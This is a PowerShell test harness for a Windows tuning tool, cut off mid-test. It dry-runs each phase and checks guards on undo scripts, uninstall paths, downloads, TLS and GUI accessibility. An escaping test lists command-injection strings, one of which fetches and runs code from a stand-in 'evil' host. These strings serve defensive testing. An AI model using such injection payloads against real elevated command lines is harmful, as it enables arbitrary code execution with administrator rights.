#Requires -Version 5.1
<#
.SYNOPSIS
    Exercises every phase's dry-run path without the elevation gate.

.DESCRIPTION
    The compiled script self-elevates, which means running it to test it triggers
    a UAC prompt and a second window. This harness dot-sources the source modules
    directly instead, skipping 01-header (the param block and elevation) and
    99-main (which calls Invoke-Main immediately).

    Everything it runs is read-only: -DryRun makes Set-Reg/Remove-Reg print
    rather than write, and every phase that shells out checks $DryRun first.

    This is a smoke test, not a correctness test. It proves the code runs, the
    detection works, and the phases produce the changes they claim. It cannot
    prove the registry values are the right ones - that needs a VM.
#>
[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0

$root = Split-Path $PSScriptRoot -Parent

# Stand in for the compiled script's param block.
$DryRun           = $true
$Skip             = @()
$Only             = @()
$NoRestorePoint   = $true
$Aggressive       = $false
$WinUtilConfigUrl = Join-Path $root 'config\winutil-tweaks.json'
$NvidiaProfile    = ''
$DisableMemoryIntegrity = $false
$NoRestartPrompt  = $true
$Cleanup = $false; $IncludeDuplicates = $false; $CleanupSelection = ''
$Gui = $false; $ApplySelection = ''

foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1' | Sort-Object Name)) {
    if ($f.Name -eq '01-header.ps1' -or $f.Name -eq '99-main.ps1') { continue }
    . $f.FullName
}

# 01-header cannot be dot-sourced whole - its param block must come first and
# its top level relaunches the process elevated. But the argument-escaping used
# to build that elevated command line lives in it, and leaving the single most
# security-critical function in the codebase untestable is not acceptable.
# So its function DEFINITIONS are lifted out by parsing, and nothing else runs.
$headerAst = [System.Management.Automation.Language.Parser]::ParseFile(
    (Join-Path (Join-Path $root 'src') '01-header.ps1'), [ref]$null, [ref]$null)
foreach ($fn in $headerAst.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false)) {
    . ([scriptblock]::Create($fn.Extent.Text))
}

# The NVIDIA phase reads its template from this variable; build.ps1 embeds it.
# The NVIDIA profile is composed per card in 11-gpu.ps1; there is no asset.

$failures = [System.Collections.Generic.List[string]]::new()

function Test-Phase {
    param([string]$Name, [scriptblock]$Body)
    try {
        & $Body
        Write-Host "PASS  $Name" -ForegroundColor Green
    } catch {
        Write-Host "FAIL  $Name" -ForegroundColor Red
        Write-Host "      $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "      $($_.ScriptStackTrace -split "`n" | Select-Object -First 2)" -ForegroundColor DarkRed
        $failures.Add("$Name : $($_.Exception.Message)") | Out-Null
    }
}

Write-Host ''
Write-Host 'Trim - dry run harness' -ForegroundColor Cyan
Write-Host ''

$facts = $null
Test-Phase 'Get-MachineFacts'     { $script:facts = Get-MachineFacts }
Test-Phase 'Show-MachineFacts'    { Show-MachineFacts -Facts $script:facts }
Test-Phase 'Read-WinUtilConfig'   {
    $sel = Read-WinUtilConfig -Source $WinUtilConfigUrl
    if (@($sel).Count -lt 15) { throw "expected 15+ selections, got $(@($sel).Count)" }
    $bad = @($sel | Where-Object { $_ -notmatch '^WPF(Install|Tweaks|Toggle|Feature|Appx)' })
    if ($bad.Count) { throw "config has keys winutil will reject: $($bad -join ', ')" }
}
Test-Phase 'Invoke-WinUtilPhase'  { Invoke-WinUtilPhase -ConfigUrl $WinUtilConfigUrl }
Test-Phase 'Invoke-FixesPhase'    { Invoke-FixesPhase }
Test-Phase 'Invoke-GamingPhase'   { Invoke-GamingPhase -Facts $script:facts }
Test-Phase 'Invoke-PrivacyPhase'  { Invoke-PrivacyPhase }
Test-Phase 'Invoke-AppxPhase'     { Invoke-AppxPhase }
Test-Phase 'Invoke-NetworkPhase'  { Invoke-NetworkPhase -Facts $script:facts }
Test-Phase 'Invoke-GpuPhase'   { Invoke-GpuPhase -Facts $script:facts -ProfileOverride '' }
Test-Phase 'Invoke-PerformancePhase' { Invoke-PerformancePhase -Facts $script:facts }
Test-Phase 'Invoke-BackgroundPhase'  { Invoke-BackgroundPhase }
Test-Phase 'Invoke-ExtrasPhase'   { Invoke-ExtrasPhase -Facts $script:facts }
Test-Phase 'Invoke-SecurityPhase' { Invoke-SecurityPhase -Facts $script:facts }
Test-Phase 'Security phase is opt-in only' {
    # The guarantee: a default run must never disable Memory Integrity.
    $before = Get-MemoryIntegrityState
    $n = $script:Ledger.Count
    Invoke-SecurityPhase -Facts $script:facts
    if ($script:Ledger.Count -ne $n) { throw 'default Security phase recorded a change; it must be read-only' }
    if (-not $before) { throw 'could not read Memory Integrity state' }
}
Test-Phase 'Invoke-Personalisation' { Invoke-PersonalisationPhase }

# The undo generator is the safety net; prove it emits valid PowerShell from a
# synthetic ledger rather than trusting it only on the day something goes wrong.
Test-Phase 'Write-UndoScript (synthetic ledger)' {
    $saved = $DryRun
    Set-Variable -Name DryRun -Value $false -Scope 1
    $script:Ledger.Clear()
    $script:Ledger.Add([pscustomobject]@{
        Action='set'; Path='HKCU:\Software\TrimSelfTest'; Name='HadOne'
        NewValue=1; HadValue=$true; OldValue=7; OldType='DWord'; KeyExisted=$true }) | Out-Null
    $script:Ledger.Add([pscustomobject]@{
        Action='set'; Path='HKCU:\Software\TrimSelfTest'; Name='WasAbsent'
        NewValue=1; HadValue=$false; OldValue=$null; OldType='DWord'; KeyExisted=$true }) | Out-Null
    $script:Ledger.Add([pscustomobject]@{
        Action='set'; Path='HKCU:\Software\TrimSelfTest'; Name="Quote'd"
        NewValue='a'; HadValue=$true; OldValue="it's"; OldType='String'; KeyExisted=$true }) | Out-Null

    Write-UndoScript
    Set-Variable -Name DryRun -Value $saved -Scope 1

    if (-not (Test-Path $script:UndoPath)) { throw 'no undo script written' }
    $errs = $null
    [void][System.Management.Automation.Language.Parser]::ParseFile($script:UndoPath, [ref]$null, [ref]$errs)
    if ($errs -and $errs.Count) { throw "undo script does not parse: $($errs[0].Message)" }

    $text = Get-Content -Raw $script:UndoPath
    if ($text -notmatch 'Remove-ItemProperty.*WasAbsent') { throw 'absent value should be removed on undo, not restored' }
    if ($text -notmatch "it''s")                          { throw 'single quotes not escaped in undo script' }
    # Newest-first: the quoted entry was added last, so it must unwind first.
    if ($text.IndexOf("Quote''d") -gt $text.IndexOf('HadOne')) { throw 'undo is not in reverse order' }
}

# Guard the AppX protection list: a prefix in the removal list must never be able
# to sweep up something load-bearing.
Test-Phase 'AppX protection guard' {
    foreach ($p in @('Microsoft.DesktopAppInstaller','Microsoft.WindowsStore',
                     'Microsoft.XboxIdentityProvider','Microsoft.ScreenSketch',
                     'Microsoft.VCLibs.140.00','Microsoft.SecHealthUI')) {
        if (-not (Test-AppxProtected $p)) { throw "'$p' is NOT protected but must be" }
    }
    foreach ($r in ($script:AppxRemoveStandard + $script:AppxRemoveAggressive + $script:AppxRemoveOem)) {
        if (Test-AppxProtected $r) { throw "removal list entry '$r' collides with the protected list" }
    }
}

# The window's whole promise is that what you saw is what gets applied. That
# rests entirely on the selection filter, so it gets its own test rather than
# being trusted because it looks right.
Test-Phase 'Selection filter gates every change' {
    $script:Ledger.Clear(); $script:Actions.Clear(); $script:AlreadySet.Clear()

    # 1. A filter matching nothing must produce no planned changes at all.
    $script:SelectionFilter = @{ 'reg|HKCU:\Software\NoSuchKey|Nope' = $true }
    Invoke-GamingPhase -Facts $script:facts
    Invoke-PrivacyPhase
    Invoke-PersonalisationPhase
    if ($script:Ledger.Count -ne 0) {
        $script:SelectionFilter = $null
        throw "filter matched nothing but $($script:Ledger.Count) change(s) were still planned"
    }

    # 2. A filter naming exactly one key must produce exactly that one.
    $script:SelectionFilter = $null
    $script:Ledger.Clear()
    Invoke-GamingPhase -Facts $script:facts
    if ($script:Ledger.Count -lt 2) { throw 'expected the unfiltered phase to plan more than one change' }
    $pick = $script:Ledger[0]
    $key  = "reg|$($pick.Path)|$($pick.Name)"

    $script:Ledger.Clear()
    $script:SelectionFilter = @{ $key = $true }
    Invoke-GamingPhase -Facts $script:facts
    $got = $script:Ledger.Count
    $script:SelectionFilter = $null
    if ($got -ne 1) { throw "filter named 1 key but $got change(s) were planned" }
}

# The GUI's item model is what the filter keys are built from, so a mismatch
# between the two would silently apply nothing.
Test-Phase 'GUI item keys match filter keys' {
    $script:Ledger.Clear(); $script:Actions.Clear()
    Invoke-GamingPhase -Facts $script:facts
    Invoke-AppxPhase
    $items = Get-GuiItems -Ledger $script:Ledger -Actions $script:Actions
    if (@($items).Count -eq 0) { throw 'no items built' }

    foreach ($i in $items) {
        if ($i.Key -notmatch '^(reg|act)\|') { throw "item key '$($i.Key)' has no recognised prefix" }
        if (-not $i.Phase) { throw "item '$($i.Title)' has no phase" }
        if ($i.Tier -notin @('safe','op','trade')) { throw "item '$($i.Title)' has tier '$($i.Tier)'" }
    }
    # Every registry item's key must round-trip through Test-SelectedChange.
    $regItem = @($items | Where-Object { $_.Kind -eq 'reg' })[0]
    $script:SelectionFilter = @{ $regItem.Key = $true }
    if (-not (Test-SelectedChange $regItem.Key)) { $script:SelectionFilter = $null; throw 'a GUI key did not match its own filter entry' }
    $script:SelectionFilter = $null

    # Trade-offs must never arrive pre-selected.
    $preTrade = @($items | Where-Object { $_.Tier -eq 'trade' -and $_.Selected }).Count
    if ($preTrade -gt 0) { throw "$preTrade trade-off item(s) were pre-selected" }
}

# The cleanup scan runs unelevated from the window, where several of the paths
# it probes are unreadable. Test-Path THROWS on those rather than returning
# false, so this asserts the scan stays quiet and returns usable rows.
Test-Phase 'Cleanup scan is read-only and never throws' {
    $before = $script:Ledger.Count
    $rows = @(Get-CleanupScan -Quiet)
    if ($script:Ledger.Count -ne $before) { throw 'the cleanup scan recorded a change; it must only measure' }

    foreach ($r in $rows) {
        if (-not $r.Path)                       { throw 'a cleanup row has no path' }
        if ($r.Bytes -lt 0)                     { throw "'$($r.Path)' reports negative bytes" }
        if ($r.Count -le 0)                     { throw "'$($r.Path)' was returned with no files" }
        if ($r.Tier -notin @('safe','op','trade')) { throw "'$($r.Path)' has tier '$($r.Tier)'" }
        if ($r.Key -notlike 'clean|*')          { throw "'$($r.Path)' has key '$($r.Key)'" }
        # Nothing outside a named location may ever be offered for deletion.
        if ($r.Path -match '^[A-Za-z]:\?$')    { throw "'$($r.Path)' is a drive root" }
    }

    # Anything that loses something a person might want must not be pre-ticked.
    $badDefault = @($rows | Where-Object { $_.Tier -ne 'safe' -and $_.Selected }).Count
    if ($badDefault) { throw "$badDefault non-safe cleanup location(s) are selected by default" }

    # Windows.old must never be anything but a trade-off.
    foreach ($r in ($rows | Where-Object { $_.Path -like '*Windows.old*' })) {
        if ($r.Tier -ne 'trade') { throw 'Windows.old is not marked as a trade-off' }
    }
}

# The three presets are only meaningful if there is real ground between them.
# Before the More options phase existed, Safe and Caution were the whole
# catalogue and Recommended ticked every single box.
Test-Phase 'Presets are genuinely different from each other' {
    $script:Ledger.Clear(); $script:Actions.Clear(); $script:AlreadySet.Clear()
    Invoke-PerformancePhase -Facts $script:facts
    Invoke-PrivacyPhase
    Invoke-NetworkPhase -Facts $script:facts
    Invoke-ExtrasPhase -Facts $script:facts
    $items = Get-GuiItems -Ledger $script:Ledger -Actions $script:Actions

    $safe  = @($items | Where-Object { $_.Tier -eq 'safe'  }).Count
    $caut  = @($items | Where-Object { $_.Tier -eq 'op'    }).Count
    $risky = @($items | Where-Object { $_.Tier -eq 'trade' }).Count

    if ($safe  -lt 3) { throw "only $safe safe item(s)" }
    if ($caut  -lt 15) { throw "only $caut caution item(s) - not enough ground between the presets" }
    if ($risky -lt 2) { throw "only $risky risky item(s) - Aggressive would be identical to Recommended" }

    # Recommended must be a strict subset of everything.
    $recommended = $safe + $caut
    if ($recommended -ge $items.Count) { throw 'Recommended would still select everything' }
}

# This program relaunches itself as administrator by composing a command line.
# Anything interpolated into that string crosses a privilege boundary, so an
# unescaped quote is not a formatting bug - it is arbitrary code running with
# full rights immediately after the user approves a UAC prompt they believe they
# are granting to Trim.
Test-Phase 'Elevation arguments cannot break out of their quoting' {
    $attacks = @(
        "x'; Start-Process calc; '",
        "x' ; iex (irm http://evil/) ; '",
        "'''",
        "a'b'c",
        "C:\path with 'quotes' in it.json"
    )
    foreach ($a in $attacks) {
        $escaped = ConvertTo-SafeArgument $a
        # Rebuild the exact construction the elevation path uses and confirm the
        # value survives as a single literal rather than becoming code.
        $rebuilt = Invoke-Expression "'$escaped'"
        if ($rebuilt -ne $a) { throw "escaping changed the value: '$a' became '$rebuilt'" }
    }

    # Control characters are refused outright rather than escaped.
    foreach ($bad in @("x`0y", "x`ny", "x`ry")) {
        $threw = $false
        try { ConvertTo-SafeArgument $bad } catch { $threw = $true }
        if (-not $threw) { throw 'a control character was accepted into an elevated argument' }
    }

    if ((ConvertTo-SafeArgument '') -ne '')       { throw 'empty string was not handled' }
    if ((ConvertTo-SafeArgument $null) -ne '')    { throw 'null was not handled' }
}

# Running as administrator means a bare tool name resolves through PATH, and a
# writable PATH entry then executes with those rights.
Test-Phase 'System tools resolve to real system paths' {
    foreach ($t in @('powercfg.exe','netsh.exe','reg.exe','sfc.exe','DISM.exe','shutdown.exe')) {
        $path = Get-SystemTool $t
        if (-not $path) { throw "'$t' did not resolve" }
        if (-not (Test-Path -LiteralPath $path)) { throw "'$t' resolved to a path that does not exist: $path" }
        if ($path -notmatch '(?i)\\Windows\\(System32|Sysnative)\\') {
            throw "'$t' resolved outside System32: $path"
        }
    }

    # And no source file may invoke one of them by bare name any more.
    $offenders = [System.Collections.Generic.List[string]]::new()
    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $lines = Get-Content -LiteralPath $f.FullName
        $inHelp = $false
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            # Comment-based help quotes the very pattern this guard looks for,
            # in the course of explaining why it is gone.
            if ($line -match '<#') { $inHelp = $true }
            if ($inHelp) { if ($line -match '#>') { $inHelp = $false }; continue }
            if ($line -match '^\s*#') { continue }
            if ($line -match '&\s+(powercfg|netsh|sfc|shutdown|winget|reg)\b' -and
                $line -notmatch 'Get-SystemTool') {
                $offenders.Add("$($f.Name) line $($i + 1)") | Out-Null
            }
            if ($line -match "-FilePath\s+'(DISM|sfc|reg|netsh|powercfg|shutdown)" ) {
                $offenders.Add("$($f.Name) line $($i + 1)") | Out-Null
            }
        }
    }
    if ($offenders.Count) { throw "bare tool invocation at: $($offenders -join '; ')" }
}

# The one binary this program downloads is then run as administrator.
Test-Phase 'The downloaded tool is pinned by version and hash' {
    if (-not $script:NpiSha256)                  { throw 'no pinned hash' }
    if ($script:NpiSha256.Length -ne 64)         { throw "pinned hash is $($script:NpiSha256.Length) characters" }
    if ($script:NpiSha256 -notmatch '^[0-9A-F]{64}$') { throw 'pinned hash is not hexadecimal' }
    if (-not $script:NpiBytes -or $script:NpiBytes -le 0) { throw 'no pinned size' }
    if ($script:NpiUrl -notmatch '^https://github\.com/Orbmu2k/nvidiaProfileInspector/releases/download/') {
        throw "the download URL is not a pinned GitHub release: $($script:NpiUrl)"
    }
    if ($script:NpiUrl -notmatch [regex]::Escape($script:NpiVersion)) {
        throw 'the URL does not carry the pinned version'
    }
}

# Every remote fetch has to be TLS, and modern TLS at that.
Test-Phase 'All remote fetches are https and modern TLS' {
    # Asserted against what ships, not against this test process: the header
    # sets it at top level, and the header's top level is deliberately not run
    # here. What matters is that the compiled script does it before it fetches.
    $compiled = Join-Path $root 'trim.ps1'
    if (-not (Test-Path $compiled)) { throw 'trim.ps1 has not been built' }
    $text = Get-Content -Raw -Encoding UTF8 -LiteralPath $compiled
    if ($text -notmatch 'SecurityProtocolType\]::Tls12') { throw 'the compiled script never enables TLS 1.2' }

    $tlsAt   = $text.IndexOf('SecurityProtocolType]::Tls12')
    $fetchAt = ($text.IndexOf('Invoke-WebRequest'), $text.IndexOf('Invoke-RestMethod') |
                Where-Object { $_ -gt 0 } | Measure-Object -Minimum).Minimum
    if ($fetchAt -gt 0 -and $tlsAt -gt $fetchAt) { throw 'TLS is enabled after the first fetch appears' }

    $bad = [System.Collections.Generic.List[string]]::new()
    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $lines = Get-Content -LiteralPath $f.FullName
        for ($i = 0; $i -lt $lines.Count; $i++) {
            if ($lines[$i] -match 'http://' -and $lines[$i] -notmatch '^\s*#|schemas\.microsoft\.com|www\.w3\.org') {
                $bad.Add("$($f.Name) line $($i + 1)") | Out-Null
            }
        }
    }
    if ($bad.Count) { throw "plain http reference at: $($bad -join '; ')" }
}

# A selection file is read by an elevated process and may have been written by a
# less privileged one. It can only ever gate changes the phases already planned,
# but malformed keys are still rejected rather than trusted.
Test-Phase 'Selection keys are validated, not trusted' {
    $valid   = @('reg|HKCU:\Software\Foo|Bar', 'act|command|Do the thing')
    $invalid = @('', 'nonsense', 'exec|calc.exe', "reg|x`0y", ('reg|' + ('a' * 600)))

    foreach ($k in $valid) {
        if ($k -notmatch '^(reg|act)\|[^\x00-\x1F]{1,512}$') { throw "a legitimate key was rejected: '$k'" }
    }
    foreach ($k in $invalid) {
        if ($k -match '^(reg|act)\|[^\x00-\x1F]{1,512}$') { throw "a malformed key was accepted: '$k'" }
    }

    # And the filter genuinely cannot introduce work: a key naming something no
    # phase would do must produce no changes at all.
    $script:Ledger.Clear()
    $script:SelectionFilter = @{ 'reg|HKCU:\Software\NotAThing|Nope' = $true }
    Invoke-PrivacyPhase
    $n = $script:Ledger.Count
    $script:SelectionFilter = $null
    if ($n -ne 0) { throw "a selection key that matches nothing still produced $n change(s)" }
}

# Deep uninstall is the only thing here that can destroy someone's work. Its
# guards are tested against the paths that would hurt most, and the default
# answer must always be no.
Test-Phase 'Uninstall guard refuses every dangerous path' {
    $pf   = $env:ProgramFiles
    $pf86 = ${env:ProgramFiles(x86)}
    $must_refuse = @(
        'C:\', 'C:\Windows', 'C:\Windows\System32', 'C:\Windows\SysWOW64',
        'C:\Users', $env:USERPROFILE, $env:ProgramData, $env:LOCALAPPDATA, $env:APPDATA,
        $pf, (Join-Path $pf 'WindowsApps'), (Join-Path $pf 'Common Files'),
        (Join-Path $pf 'Windows Defender'), (Join-Path $env:ProgramData 'Microsoft'),
        # Right shape, wrong owner: under a real root but not this application.
        (Join-Path $pf 'SomeOtherVendor'),
        # Outside every application root.
        'D:\Projects\win11-optimizer', 'E:\Steam',
        # Too short to be evidence of anything.
        (Join-Path $pf 'ab'),
        '', ' '
    )
    if ($pf86) { $must_refuse += @($pf86, (Join-Path $pf86 'Common Files')) }

    foreach ($path in $must_refuse) {
        if (Test-SafeToRemovePath -Path $path -AppName 'Foobar Studio' -Publisher 'Foobar Ltd') {
            throw "the guard ALLOWED '$path'"
        }
    }

    # And it has to actually permit the real case, or the feature does nothing.
    $must_allow = @(
        @{ P = (Join-Path $pf 'Foobar Studio');            A = 'Foobar Studio'; Pub = 'Foobar Ltd' }
        @{ P = (Join-Path $env:LOCALAPPDATA 'FoobarStudio'); A = 'Foobar Studio'; Pub = 'Foobar Ltd' }
        @{ P = (Join-Path $env:APPDATA 'Foobar Studio');   A = 'Foobar Studio'; Pub = 'Foobar Ltd' }
    )
    foreach ($c in $must_allow) {
        if (-not (Test-SafeToRemovePath -Path $c.P -AppName $c.A -Publisher $c.Pub)) {
            throw "the guard refused the legitimate path '$($c.P)'"
        }
    }
}

Test-Phase 'Uninstall guard refuses every dangerous registry key' {
    $must_refuse = @(
        'HKCU:\Software', 'HKLM:\SOFTWARE', 'HKLM:\SOFTWARE\WOW6432Node',
        'HKCU:\Software\Microsoft', 'HKLM:\SOFTWARE\Microsoft',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft', 'HKCU:\Software\Windows',
        'HKCU:\Software\SomeOtherVendor', 'HKCU:\Software\ab'
    )
    foreach ($k in $must_refuse) {
        if (Test-SafeToRemoveKey -Key $k -AppName 'Foobar Studio' -Publisher 'Foobar Ltd') {
            throw "the guard ALLOWED '$k'"
        }
    }
    if (-not (Test-SafeToRemoveKey -Key 'HKCU:\Software\Foobar Studio' -AppName 'Foobar Studio' -Publisher 'Foobar Ltd')) {
        throw 'the guard refused the legitimate product key'
    }
}

# Every protected publisher must be refused wholesale, not merely fail the name
# check by luck.
Test-Phase 'Uninstall never offers leftovers for a protected publisher' {
    foreach ($pub in @('Microsoft Corporation','NVIDIA Corporation','Intel Corporation','Realtek')) {
        $fake = [pscustomobject]@{
            Name = 'Some Component'; Publisher = $pub; Version = '1.0'
            InstallDir = (Join-Path $env:ProgramFiles 'Some Component')
            Uninstall = ''; QuietUninstall = ''; SizeMB = 0; RegistryKey = ''; Kind = 'win32'
        }
        $left = @(Get-AppLeftovers -App $fake)
        if ($left.Count -ne 0) { throw "publisher '$pub' produced $($left.Count) leftover candidate(s)" }
    }
}

Test-Phase 'Installed application list is usable' {
    $apps = @(Get-InstalledApplications)
    if ($apps.Count -lt 5) { throw "only $($apps.Count) applications found; the enumeration looks broken" }
    foreach ($a in $apps) {
        if (-not $a.Name) { throw 'an application has no name' }
        if ($a.Kind -notin @('win32','appx')) { throw "'$($a.Name)' has kind '$($a.Kind)'" }
    }
    # Update entries are not applications and must not be listed.
    $noise = @($apps | Where-Object { $_.Name -match '^(Update for|Security Update|KB\d{6,})' }).Count
    if ($noise) { throw "$noise Windows update entries leaked into the application list" }
}

# A profile curated on one card and applied to another is at best useless and at
# worst a failed import that applies nothing. This is the table that decides
# which settings a given card gets, so it is tested against real product names
# rather than only against the card in this machine.
Test-Phase 'GPU capability matrix' {
    $cases = @(
        @{ Name = 'NVIDIA GeForce RTX 5070 Ti';  Gen = 'blackwell';    Dlss = $true;  Fg = $true;  Mfg = $true  }
        @{ Name = 'NVIDIA GeForce RTX 4090';     Gen = 'ada';          Dlss = $true;  Fg = $true;  Mfg = $false }
        @{ Name = 'NVIDIA GeForce RTX 3060 Ti';  Gen = 'ampere';       Dlss = $true;  Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce RTX 2070 SUPER'; Gen = 'turing';     Dlss = $true;  Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce GTX 1660 Ti';  Gen = 'turing-nort';  Dlss = $false; Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce GTX 1080 Ti';  Gen = 'pascal';       Dlss = $false; Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce GTX 970';      Gen = 'maxwell';      Dlss = $false; Fg = $false; Mfg = $false }
    )
    foreach ($c in $cases) {
        $cap = Get-NvidiaCapability -GpuNames @($c.Name)
        if (-not $cap)                        { throw "'$($c.Name)' was not recognised as NVIDIA" }
        if ($cap.Generation   -ne $c.Gen)     { throw "'$($c.Name)' -> '$($cap.Generation)', expected '$($c.Gen)'" }
        if ($cap.HasDlss      -ne $c.Dlss)    { throw "'$($c.Name)' DLSS=$($cap.HasDlss), expected $($c.Dlss)" }
        if ($cap.HasFrameGen  -ne $c.Fg)      { throw "'$($c.Name)' FrameGen=$($cap.HasFrameGen), expected $($c.Fg)" }
        if ($cap.HasMultiFrame -ne $c.Mfg)    { throw "'$($c.Name)' MultiFrame=$($cap.HasMultiFrame), expected $($c.Mfg)" }
    }

    # A non-NVIDIA name must return nothing rather than a bogus capability set.
    foreach ($n in @('AMD Radeon RX 7900 XTX','Intel(R) Arc(TM) A770 Graphics')) {
        if (Get-NvidiaCapability -GpuNames @($n)) { throw "'$n' was wrongly treated as NVIDIA" }
    }
}

# The composed profile must never contain a setting the card cannot do - that is
# the whole reason for composing it rather than shipping a file.
Test-Phase 'Composed NVIDIA profile matches the card' {
    $dlssIds  = @(283385345, 283385346, 283385350, 283385331, 283385335, 279951208, 280859683, 6505105)
    $fgIds    = @(283385347, 283385329)
    $mfgIds   = @(273507943)
    $desktop  = [pscustomobject]@{ IsLaptop = $false; RefreshRate = 144 }
    $laptop   = [pscustomobject]@{ IsLaptop = $true;  RefreshRate = 60  }

    $old = Get-NvidiaSettings -Cap (Get-NvidiaCapability -GpuNames @('NVIDIA GeForce GTX 1080 Ti')) -Facts $desktop -FrameLimit 141
    foreach ($id in ($dlssIds + $fgIds + $mfgIds)) {
        if (@($old | Where-Object { $_.Id -eq $id }).Count) { throw "a GTX 1080 Ti profile contains setting $id" }
    }
    if (-not @($old | Where-Object { $_.Id -eq 274197361 }).Count) { throw 'desktop profile is missing power management mode' }

    $ada = Get-NvidiaSettings -Cap (Get-NvidiaCapability -GpuNames @('NVIDIA GeForce RTX 4070')) -Facts $desktop -FrameLimit 141
    foreach ($id in $dlssIds + $fgIds) {
        if (-not @($ada | Where-Object { $_.Id -eq $id }).Count) { throw "an RTX 4070 profile is missing setting $id" }
    }
    foreach ($id in $mfgIds) {
        if (@($ada | Where-Object { $_.Id -eq $id }).Count) { throw "an RTX 4070 profile contains multi-frame setting $id" }
    }

    # Laptops must not get the clocks pinned high.
    $lap = Get-NvidiaSettings -Cap (Get-NvidiaCapability -GpuNames @('NVIDIA GeForce RTX 4060 Laptop GPU')) -Facts $laptop
    if (@($lap | Where-Object { $_.Id -eq 274197361 }).Count) { throw 'a laptop profile pins the power management mode' }

    # And the result has to be well-formed XML, or Profile Inspector rejects it.
    $xml = ConvertTo-NipXml -Settings $ada
    $doc = New-Object System.Xml.XmlDocument
    $doc.LoadXml(($xml -replace 'utf-16', 'utf-8'))
    $count = $doc.SelectNodes('//ProfileSetting').Count
    if ($count -ne $ada.Count) { throw "XML has $count settings, expected $($ada.Count)" }
}

# This script is developed on one machine and run on machines we never see, so
# the assumptions that machine happens to satisfy are exactly the ones that rot.
Test-Phase 'Portability guard' {
    $srcDir = Join-Path $root 'src'
    $problems = [System.Collections.Generic.List[string]]::new()

    foreach ($f in (Get-ChildItem $srcDir -Filter '*.ps1')) {
        $n = $f.Name
        $lines = Get-Content -LiteralPath $f.FullName
        $inHelp = $false
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            # Comment-based help legitimately names the very things this guard
            # looks for, in the course of explaining why not to use them.
            if ($line -match '<#') { $inHelp = $true }
            if ($inHelp) { if ($line -match '#>') { $inHelp = $false }; continue }
            if ($line -match '^\s*#') { continue }
            $where = "$n line $($i + 1)"

            # A literal drive letter is always someone's specific machine.
            if ($line -match "['\`"][D-Zd-z]:\\\\" -and $line -notmatch 'HK[A-Z]+:|env:|Join-Path|XboxGames|SteamLibrary') {
                $problems.Add("$where hardcodes a drive path") | Out-Null
            }
            # WOW6432Node written by hand does not exist on 32-bit Windows.
            #
            # Building a path with it is the fault. Testing whether a path you
            # were handed happens to be the 32-bit one is not, so a bare quoted
            # token in a comparison is allowed - the previous rule flagged that
            # too, which is a false positive that pushes people towards worse
            # code to appease the test.
            $buildsPath = $line -match '\\WOW6432Node' -or $line -match 'WOW6432Node\\'
            if ($buildsPath -and $line -notmatch 'Get-SoftwareHivePaths|Is64BitOperatingSystem') {
                $problems.Add("$where hardcodes WOW6432Node instead of using Get-SoftwareHivePaths") | Out-Null
            }
            # ProgramFiles(x86) is undefined on 32-bit Windows.
            if ($line -match '\$\{env:ProgramFiles\(x86\)\}' -and $n -ne '03-detect.ps1') {
                $problems.Add("$where uses ProgramFiles(x86) directly instead of Get-ProgramFilesRoots") | Out-Null
            }
            # Adapter DisplayName/DisplayValue are translated strings.
            if ($line -match '(DisplayName|DisplayValue)\s+-match' -and $n -eq '10-network.ps1') {
                $problems.Add("$where matches a localised adapter string; use RegistryKeyword") | Out-Null
            }
        }
    }
    if ($problems.Count -gt 0) { throw ($problems -join '; ') }
}

# The camera/mic/screen-capture carve-out is the promise most likely to be broken
# by a careless edit to the deny list.
Test-Phase 'Window is legible and keyboard-navigable' {
    $problems = [System.Collections.Generic.List[string]]::new()
    $xaml = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '13-gui.ps1')

    # Custom ControlTemplates replace the default focus adorner. Every one of
    # them has to put something back, or a keyboard user cannot see where they
    # are. All three shipped without it.
    foreach ($ctrl in @('Btn', 'Nav')) {
        $block = [regex]::Match($xaml, "(?s)x:Key=""$ctrl"".*?</Style>")
        if (-not $block.Success) { $problems.Add("style $ctrl not found") | Out-Null; continue }
        if ($block.Value -notmatch 'IsKeyboardFocused') {
            $problems.Add("$ctrl has no keyboard focus indicator") | Out-Null
        }
    }
    $cb = [regex]::Match($xaml, '(?s)<Style TargetType="CheckBox">.*?</Style>')
    if (-not $cb.Success) { $problems.Add('CheckBox style not found') | Out-Null }
    elseif ($cb.Value -notmatch 'IsKeyboardFocused') {
        $problems.Add('CheckBox has no keyboard focus indicator') | Out-Null
    }

    # Text colours, measured rather than eyeballed. Faint is the secondary line
    # on every row and shipped at 3.0:1 on a raised panel.
    Add-Type -AssemblyName System.Drawing
    function Get-RelLum([string]$hex) {
        $c = [System.Drawing.ColorTranslator]::FromHtml($hex)
        $v = @($c.R, $c.G, $c.B) | ForEach-Object {
            $x = $_ / 255
            if ($x -le 0.03928) { $x / 12.92 } else { [Math]::Pow(($x + 0.055) / 1.055, 2.4) }
        }
        0.2126 * $v[0] + 0.7152 * $v[1] + 0.0722 * $v[2]
    }
    function Get-Contrast($a, $b) {
        $x = Get-RelLum $a; $y = Get-RelLum $b
        ([Math]::Max($x, $y) + 0.05) / ([Math]::Min($x, $y) + 0.05)
    }

    # Pulled from the XAML so the test cannot drift from the palette.
    $named = @{}
    foreach ($m in [regex]::Matches($xaml, '<SolidColorBrush x:Key="(\w+)"\s+Color="(#[0-9A-Fa-f]{6})"')) {
        $named[$m.Groups[1].Value] = $m.Groups[2].Value
    }
    foreach ($k in @('Ink', 'Soft', 'Faint')) {
        if (-not $named.ContainsKey($k)) { $problems.Add("brush $k missing from the palette") | Out-Null; continue }
        foreach ($bg in @('#171C1B', '#1E2524', '#263130')) {
            $r = [Math]::Round((Get-Contrast $named[$k] $bg), 2)
            if ($r -lt 4.5) {
